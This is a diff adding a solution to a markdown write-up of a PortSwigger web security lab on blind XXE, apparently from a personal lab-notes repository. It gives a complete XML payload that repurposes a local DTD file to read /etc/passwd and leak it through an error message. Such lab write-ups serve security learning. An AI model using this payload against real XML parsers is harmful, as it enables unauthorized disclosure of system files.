@@ -214,3 +214,23 @@ To solve the lab, trigger an error message containing the contents of the /etc/p
 You'll need to reference an existing DTD file on the server and redefine an entity from it.
 
 ### Sol :
+
+* Click `check stock` and intercept the request.
+* Give the below payload as entity definition in between the XML declaration and the stockCheck element:
+
+        <!DOCTYPE message [
+      <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+      <!ENTITY % ISOamso '
+      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+      &#x25;eval;
+      &#x25;error;
+      '>
+      %local_dtd;
+      ]>
+
+* This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8c8b09dd-f312-44b9-bfc4-5c50eb31ffc9)
+
+* Thus, the lab is solved.
